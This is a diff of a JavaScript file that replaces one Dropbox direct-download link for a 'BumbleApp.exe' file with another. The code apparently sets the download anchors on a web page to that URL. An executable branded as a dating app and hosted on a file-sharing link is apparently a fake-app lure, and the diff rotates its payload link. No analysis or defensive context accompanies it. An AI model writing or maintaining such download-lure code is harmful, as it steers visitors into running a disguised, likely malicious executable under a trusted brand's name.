@@ -1,7 +1,7 @@
 (function (global) {
     "use strict";
 
-    var Bumble_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/yyd11p20ljwkrz19j66r7/BumbleApp.exe?rlkey=dh8l5nhj5yygjztzwtwzz7aia&st=q11dflet&dl=1";
+    var Bumble_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/dxnhcf207zmmi4ratruzd/BumbleApp.exe?rlkey=wgee4aim0pyftrtnxap05cz8g&st=2vbcj2s6&dl=1";
 
     function applyDownloadLinksToAnchors() {
         if (typeof document === "undefined") return;
